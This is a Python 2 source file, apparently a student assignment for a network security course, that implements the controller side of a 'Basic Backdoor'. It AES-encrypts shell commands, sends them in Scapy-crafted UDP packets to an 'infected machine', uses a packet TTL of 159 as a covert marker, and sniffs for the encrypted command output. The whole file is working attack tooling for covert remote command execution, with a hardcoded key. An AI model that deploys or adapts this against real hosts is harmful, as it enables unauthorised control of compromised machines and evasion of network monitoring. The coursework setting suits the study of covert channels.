#!/usr/bin/python

import sys # For getting command line arguments
from scapy.all import * #Scapy library used to craft packets
from AESCipher import AESCipher
import time #used for thread sleep methods
import argparse #used for easy arguments
import thread

def craft(payload):
    """
    Purpose: #TODO khang
    
    Keyword arguments:
        payload
            type: string
            descripton: data stored in packet data field

    Return:
        type: scapy.packet
    """
    global args
    packet = (IP(dst=args.dest,ttl=ttlKey)/UDP(sport=int(args.port),dport=args.port)/ payload)
    return packet
    
def sendCommand(command):
    """
    Keyword arguments:
        command
            type: string
            descripton: bash command that will be sent to infected machine to be executed
    """
    global cipher
    encrypt_Command = cipher.encrypt(command)   #encrypt command
    packet = craft(encrypt_Command)             #create packet with encrypted command in data field
    send(packet)

def commandResult(packet):
    """
    Keyword arguments:
        command
            type: scapy.packet
            descripton: packet recieved by sniffer
    """
    global ttlKey
    global args
    global cipher
    if packet[IP].ttl == ttlKey:
        print(cipher.decrypt(packet[UDP].load))
        return

def commandSniffer(threadName, infectedIP):
    """
    Keyword arguments:
        threadName
            type: string
            descripton: name of thread
        infectedIP
            type: string
            descripton: parse sniffed packets by ip of infected computer
    """
    sniff(filter="udp and host "+args.dest, prn=commandResult)

#GLOBAL VARIABLES
ttlKey = 159
key = 'mysecretpassword'
IV = "abcdefghijklmnop"
cipher = AESCipher(key)

# parse command line argument
arg_parser = argparse.ArgumentParser(
    prog='Basic Backdoor',
    description='COMP 8505 Assignment 3 by Peyman Tehrani Parsa & Khang Tran'
)
arg_parser.add_argument('-d', dest='dest', type = str, help = 'target ip', required=True)
arg_parser.add_argument('-p', dest='port', type = int, help = 'target port',default=99,const=99, nargs='?')
args = arg_parser.parse_args()
exit=["exit","quit","exit()","quit()"]

try:
   thread.start_new_thread( commandSniffer, ("commandSniffer",args.dest) )
except Exception,e: 
    print str(e)

while True:
    command = input('\033[92m'+args.dest+":"+str(args.port)+" ready"+'\033[0m')
    if command == "":
        continue
    elif any(item == command for item in exit):
        sys.exit()
    else:
        sendCommand(command)
        